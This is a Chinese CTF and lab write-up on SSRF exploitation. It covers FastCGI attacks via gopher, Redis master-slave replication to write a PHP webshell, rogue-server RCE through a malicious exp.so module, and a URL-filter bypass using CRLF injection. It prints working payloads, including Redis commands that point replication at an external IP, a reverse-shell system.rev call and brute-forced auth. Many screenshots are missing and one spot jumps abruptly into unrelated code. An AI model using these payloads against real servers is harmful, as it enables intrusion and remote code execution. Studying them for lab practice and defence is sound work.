因为我的服务器选择的就是`nginx`和`php`，单并没有使用9000端口，查看`log`日志发现它使用的是`sock`方法，所以我就没换，使用了CTFHUB的靶机进行操作。
###### 攻击原理
在`PHP`当中我们可以利用`php://input`进行一些代码执行等等，而在文件上传中我们也经常利用到`htacess`文件以及`usr.ini`文件，他们都有两个选项：`auto_prepend_file`和`auto_append_file`，将两者结合，我们让文件在加载前预加载`php://input`就能进行任何的`PHP`代码执行了，然后利用`PHP`当中的各种内置函数来进行命令执行就能够`getshell`。
###### 具体步骤
在我们使用一系列的方式进行信息搜集后发现目标机器使用了`Fastcgi`并且确认其网站上存在`ssrf`漏洞。
因为看他的原理就可以发现这个实现是有点复杂的，所以我们可以直接利用网上的`exp`进行攻击。
第一种方法利用GOPHER生成payload直接打：  
可以看到打成功了。  
写个定时任务就能一直弹`shell`了。
我们观察一下`Gophers`给我们的`poc`。  
第二种也可以利用别人的`exp`，`github`上面有很多，我这里直接用p神的。  
本地开个端口监听:  
把流量抓下来：  
进行转换发包：  
成功执行我的`php`所以可以看见这其实是一个很麻烦的地方，能用`gophers`就尽量用吧。
##### 主从复制
关于主从复制：
    如果当前服务器已经是某个主服务器(master server)的从属服务器，那么执行 SLAVEOF host port 将使当前服务器停止对旧主服务器的同步，丢弃旧数据集，转而开始对新主服务器进行同步。
    另外，对一个从属服务器执行命令 SLAVEOF NO ONE 将使得这个从属服务器关闭复制功能，并从从属服务器转变回主服务器，原来同步所得的数据集不会被丢弃。
适应场景：
    当我们写shell的时候我们无法绕过对特殊字符的过滤，我们可以利用主从服务器。
利用主从服务器来写`shell`:
##### 环境搭建：
在这里因为我本机装`redis`两个实例没搞出来,因为装的时候就不太一样，所以我直接拉了一个`docker`，并且做了个端口映射。  
其实觉得部分的命令都已经在`dict`协议的时候写过了，多了这么一点。
在本机上先试一下主从复制，然后放到公网上搞。
`docker exec -it redis-test /bin/bash`进入`docker`容器里，连上`redis`。
`master`：  
`slave`:  
利用这个我们可以编写`webshell`
在实战中：假设6390端口的`redis`是我们可控的`redis`服务器，而`6389`正是我们需要进行攻击的。
我们只需要进行主从绑定操作即可，获取到流量：
将其编码利用`gophers`进行发送。
同时我们还需要
此时我们查看一下从机。  
发现已经是写进行了主从复制。  
这里编码的是这些数据包：  
在主机上：  
发送`save`包：  
访问`phpinfo.php`:  
完成了主从复制的写`shell`。
而有些时候需要进行`auth`的授权，在那里可以尝试根据他的返回流量进行爆破。
当然网上还有一键就能写`shell`的，利用python脚本模拟`redis`主从之间的交互过程：  
##### 主从复制RCE
在上面我们已经通过主从复制完成了`WebShell`的写入，其实还可以更进一步直接`RCE`，在`redis`的`4.x`以及`5.x`版本当中是存在RCE的可能性的。
相关命令：
    设置redis的备份路径:config set dir ./
    设置备份文件名为exp.so，默认为dump.rdb:config set dbfilename exp.so
    设置主服务器IP和端口:slaveof 192.168.172.129 1234  
    加载恶意模块:module load ./exp.so
    切断主从，关闭复制功能:slaveof no one 
    执行系统命令:system.exec 'whoami';system.rev 127.0.0.1 9999    
    通过dump.rdb文件恢复数据:config set dbfilename dump.rdb
    删除exp.so:system.exec 'rm ./exp.so'
    卸载system模块的加载:module unload system
###### 生成exp.so
网上有很多`exp`的`poc`,这里拿的是
`r3kapig`写的。  
在实际当中很少有这样的情况，如果我们完成一次这样的渗透需要满足两个条件：
`protected-mode`为`no`, bind 由`127.0.0.1` 改为`0.0.0.0`。
ps：`bind`改动后服务器上任意网卡地址可访问
`在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。`
现在我自己的机器上试验一下：
    [>] PING - test if a connection is still alive
    [] REPLCONF - exchange replication information between master and slave
    [] PSYNC/SYNC - synchronize slave state with the master
    [请求错误:非正常端口,因安全问题只允许抓取80,443端口的链接,如有特殊需求请自行修改程序".PHP_EOL;
            return false;
        }else{
            preg_match('/^\d+$/', $parsed['host']) && $parsed['host'] = long2ip($parsed['host']);
            $long = ip2long($parsed['host']);
            if($long===false){
                $ip = null;
                if($safe){
                    @putenv('RES_OPTIONS=retrans:1 retry:1 timeout:1 attempts:1');
                    $ip   = gethostbyname($parsed['host']);
                    $long = ip2long($ip);
                    $long===false && $ip = null;
                    @putenv('RES_OPTIONS');
                }
            }else{
                $ip = $parsed['host'];
            }
            $ip && $validate_ip = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);
        }
        if(!in_array($parsed['scheme'],array('http','https')) || !$validate_ip){
            echo "{$url} 请求错误:非正常URL格式,因安全问题只允许抓取 http:// 或 https:// 开头的链接或公有IP地址".PHP_EOL;
            return false;
        }else{
            return $url;
        }
    }
    function curl($url){
        $safe = false;
        if(safe_url($url,$safe)) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            $co = curl_exec($ch);
            curl_close($ch);
            echo $co;
        }
    }
    highlight_file(__FILE__);
    curl($_GET['url']);
根据两者解析的差异性直接就这么写就能打到内网：
    url=http://foo@127.0.0.1:6379%PI:EMAIL/
因为协议的限制，我们无法使用`dict`等协议，只能使用`http`那么我们可以使用`CRLF`进行内网的探测。
其实随着更进一步可以观察到这个不只有6379端口是能被利用的，5000端口也存在着漏洞，根据返回的响应头以及`hint`可以大致推断出这里才是`crlf`利用点：
    ?url=http://foo@127.0.0.1:5000%PI:EMAIL/%3Furl=https://baidu.com
接下来就是利用`Python-urllib/3.7`的`crlf`漏洞进行攻击
构造poc：
`url=http://foo@127.0.0.1:5000
@www.sina.com/?url=http://127.0.0.1:6379/%20HTTP/1.1%0D%0Aauth%20123456%0D%0Aconfig%20set%20dir%20/var/www/html%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Aslaveof%20116.62.207.70%2021000%0D%0Afoo%3A%20`
设置的`redis`命令就是：
    auth 123456 #爆破出来的弱密码
    config set dir /var/www/html
    config set dbfilename shell.php
    slaveof 116.62.207.70 21000   #21000是我们redis-rogue，用的是主从复制写shell
    foo:
没有利用`exp.so`直接`getshell`的原因是它存在的限制太多了，组内的师傅试了一下没有流量返回回来就用了写`shell`的方式。  
`shell`打出去了，直接蚁剑连一下就行。